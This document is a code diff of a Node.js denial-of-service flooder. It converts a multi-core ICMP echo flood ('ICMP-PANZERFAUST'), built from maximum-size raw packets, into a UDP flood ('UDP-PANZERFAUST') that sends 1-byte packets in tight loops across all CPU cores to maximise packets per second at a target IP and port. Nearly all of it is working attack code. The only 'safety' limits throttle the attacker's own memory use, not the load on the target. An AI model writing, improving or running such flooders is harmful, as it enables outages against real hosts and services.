@@ -1,147 +1,108 @@
-const raw = require('raw-socket');
+const dgram = require('dgram');
 const cluster = require('cluster');
 const os = require('os');
-const { exec } = require('child_process');
 
 const target = process.argv[2];
-const duration = parseInt(process.argv[3]);
-const batchSize = 10;
-const reloadMin = 23;
-const reloadMax = 25;
+const port = parseInt(process.argv[3]) || 53;
+const duration = parseInt(process.argv[4]);
 
 if (!target || isNaN(duration)) {
-  console.log('Usage: node attack.js <target_ip> <duration_seconds>');
+  console.log('Usage: node udp-panzerfaust.js <target_ip> <port> <duration_seconds>');
   process.exit(1);
 }
 
-const cores = os.cpus().length;
 const endTime = Date.now() + duration * 1000;
+const payload = Buffer.alloc(1); // 1-byte = max PPS
+const cpuCount = os.cpus().length;
+
+const SAFE_CPU_THRESHOLD = 90; // %
+const SAFE_MEM_THRESHOLD = 85; // %
 
 if (cluster.isMaster) {
-  let stats = { sent: 0, success: 0, failed: 0, maxpps: 0, bytesSent: 0 };
-  let lastLatency = 'N/A';
-
-  function formatBytes(bytes) {
-    const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB'];
-    let i = 0;
-    while (bytes >= 1024 && i < units.length - 1) {
-      bytes /= 1024;
-      i++;
-    }
-    return `${bytes.toFixed(2)} ${units[i]}`;
-  }
+  let totalSent = 0;
+  let maxPPS = 0;
 
   console.clear();
-  console.log('ICMP-PANZERFAUST [BATCH-BOMBER WITH RELOAD]');
+  console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
   console.log('--------------------------------------');
-  console.log(`Target: ${target}`);
+  console.log(`Target: ${target}:${port}`);
   console.log(`Duration: ${duration}s`);
-  console.log(`Using ${cores} cores`);
-  console.log(`Batch size: ${batchSize} packets`);
-  console.log(`Reload time: ~2.3-2.5s`);
+  console.log(`Cores: ${cpuCount}`);
   console.log('Launching...\n');
 
-  for (let i = 0; i < cores; i++) cluster.fork();
+  for (let i = 0; i < cpuCount; i++) cluster.fork();
 
   for (const id in cluster.workers) {
     cluster.workers[id].on('message', (msg) => {
       if (msg.type === 'stats') {
-        stats.sent += msg.sent;
-        stats.success += msg.success;
-        stats.failed += msg.failed;
-        stats.bytesSent += msg.bytesSent;
-        if (msg.pps > stats.maxpps) stats.maxpps = msg.pps;
+        totalSent += msg.sent;
+        if (msg.pps > maxPPS) maxPPS = msg.pps;
       }
     });
   }
 
   setInterval(() => {
     console.clear();
-    console.log('ICMP-PANZERFAUST [HEAVY]');
+    console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
     console.log('--------------------------------------');
-    console.log(`Success: ${stats.success}`);
-    console.log(`Failed: ${stats.failed}`);
-    console.log(`Max PPS: ${stats.maxpps}`);
-    console.log(`Total Sent Packets: ${stats.sent}`);
-    console.log(`Total Data Sent: ${formatBytes(stats.bytesSent)}`);
-    console.log(`Target Latency: ${lastLatency} ms`);
+    console.log(`Total Packets Sent: ${totalSent}`);
+    console.log(`Max PPS: ${maxPPS}`);
+    console.log(`Target: ${target}:${port}`);
     console.log('--------------------------------------');
-    stats.maxpps = 0;
+    maxPPS = 0;
   }, 2000);
 
-  setInterval(() => {
-    exec(`ping -c 1 ${target}`, (err, stdout) => {
-      const match = stdout.match(/time=([\d.]+) ms/);
-      if (match) lastLatency = match[1];
-    });
-  }, 4000);
-
   setTimeout(() => {
+    console.log('\nAttack complete.');
     for (const id in cluster.workers) cluster.workers[id].kill();
-    console.log('\nAttack finished.');
     process.exit(0);
   }, duration * 1000);
 
 } else {
-  const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
-
-  let seq = 0;
+  const sock = dgram.createSocket('udp4');
   let sent = 0;
-  let success = 0;
-  let failed = 0;
   let pps = 0;
-  let bytesSent = 0;
+  let isThrottled = false;
 
-  const payloadSize = 65499;
-
-  function createPacket(seqNum) {
-    const buf = Buffer.alloc(8 + payloadSize);
-    buf.writeUInt8(8, 0); // Type: Echo Request
-    buf.writeUInt8(0, 1); // Code
-    buf.writeUInt16BE(0, 2); // Checksum placeholder
-    buf.writeUInt16BE(process.pid & 0xffff, 4); // ID
-    buf.writeUInt16BE(seqNum & 0xffff, 6); // Sequence
-
-    buf.fill(0x42, 16); // Payload
-
-    let sum = 0;
-    for (let i = 0; i < buf.length - 1; i += 2) {
-      sum += buf.readUInt16BE(i);
-    }
-    if (buf.length % 2 === 1) {
-      sum += buf[buf.length - 1] << 8;
-    }
-    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
-    const checksum = (~sum) & 0xffff;
-    buf.writeUInt16BE(checksum, 2);
-
-    return buf;
+  function systemSafe() {
+    const mem = process.memoryUsage();
+    const usedMB = mem.rss / 1024 / 1024;
+    const totalMB = os.totalmem() / 1024 / 1024;
+    const usagePercent = (usedMB / totalMB) * 100;
+    return usagePercent < SAFE_MEM_THRESHOLD;
   }
 
-  async function batchSend(count) {
-    if (Date.now() >= endTime) return;
+  function spam() {
+    function sendLoop() {
+      if (Date.now() > endTime) return;
 
-    for (let i = 0; i < count; i++) {
-      const pkt = createPacket(seq++);
-      socket.send(pkt, 0, pkt.length, target, (err) => {
-        sent++;
-        pps++;
-        bytesSent += pkt.length;
-        if (err) failed++;
-        else success++;
-      });
+      if (!isThrottled && systemSafe()) {
+        for (let i = 0; i < 1000; i++) {
+          sock.send(payload, 0, payload.length, port, target, () => {
+            sent++;
+            pps++;
+          });
+        }
+        setImmediate(sendLoop);
+      } else {
+        if (!isThrottled) {
+          isThrottled = true;
+          setTimeout(() => {
+            isThrottled = false;
+          }, 10000); // throttle for 10s
+        }
+        setTimeout(sendLoop, 100); // slowdown
+      }
     }
 
-    const reloadDelay = reloadMin + Math.random() * (reloadMax - reloadMin);
-    await new Promise(r => setTimeout(r, reloadDelay));
-
-    if (Date.now() < endTime) batchSend(count);
+    sendLoop();
   }
-
-  batchSend(batchSize);
 
   setInterval(() => {
-    process.send({ type: 'stats', sent, success, failed, pps, bytesSent });
-    sent = success = failed = pps = bytesSent = 0;
-  }, 2000);
+    process.send({ type: 'stats', sent, pps });
+    sent = 0;
+    pps = 0;
+  }, 1000);
+
+  spam();
 }
